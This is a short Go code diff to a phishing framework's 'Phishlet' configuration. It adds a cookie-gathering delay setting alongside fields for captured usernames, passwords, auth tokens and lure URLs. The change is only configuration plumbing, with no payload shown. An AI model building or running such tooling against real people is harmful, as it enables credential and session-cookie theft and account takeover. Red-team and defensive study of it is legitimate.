@@ -126,6 +126,7 @@ type Phishlet struct {
 	bodyAuthTokens   map[string]*BodyAuthToken
 	httpAuthTokens   map[string]*HttpAuthToken
 	authUrls         []*regexp.Regexp
+	cookieGatherDelay int
 	username         PostField
 	password         PostField
 	landing_path     []string
@@ -237,7 +238,8 @@ type ConfigPhishlet struct {
 	ProxyHosts  *[]ConfigProxyHost   `mapstructure:"proxy_hosts"`
 	SubFilters  *[]ConfigSubFilter   `mapstructure:"sub_filters"`
 	AuthTokens  *[]ConfigAuthToken   `mapstructure:"auth_tokens"`
-	AuthUrls    []string             `mapstructure:"auth_urls"`
+	AuthUrls         []string             `mapstructure:"auth_urls"`
+	CookieGatherDelay int                  `mapstructure:"cookie_gather_delay"`
 	Credentials *ConfigCredentials   `mapstructure:"credentials"`
 	ForcePosts  *[]ConfigForcePost   `mapstructure:"force_post"`
 	LandingPath *[]string            `mapstructure:"landing_path"`
@@ -610,6 +612,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		}
 		p.authUrls = append(p.authUrls, re)
 	}
+	p.cookieGatherDelay = fp.CookieGatherDelay
 
 	if fp.Credentials.Username.Key == nil {
 		return fmt.Errorf("credentials: missing username `key` field")
@@ -823,6 +826,10 @@ func (p *Phishlet) GetLureUrl(path string) (string, error) {
 
 func (p *Phishlet) GetLoginUrl() string {
 	return "https://" + p.login.domain + p.login.path
+}
+
+func (p *Phishlet) GetCookieGatherDelay() int {
+	return p.cookieGatherDelay
 }
 
 func (p *Phishlet) GetLandingPhishHost() string {
